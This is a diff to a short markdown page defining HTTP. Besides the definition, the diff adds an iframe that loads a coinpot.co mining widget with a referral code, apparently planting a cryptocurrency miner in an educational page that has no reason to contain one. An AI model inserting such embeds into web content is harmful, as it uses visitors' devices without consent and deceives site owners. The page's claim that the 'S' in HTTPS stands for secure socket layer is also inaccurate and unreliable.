@@ -9,3 +9,4 @@ topic: http
 wikipedia_url: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol
 ---
 HTTP (Hypertext Transfer Protocol) is a request and response protocol used to send a request to a server and receive a response back in the form of a file. HTTP is the basis of data communication for the web. HTTPS is an evolution in HTTP, where the “S” stands for secure socket layer allowing communication in HTTP to be more secure.
+<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/coinpottokens/?ref=04E51F45893C&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
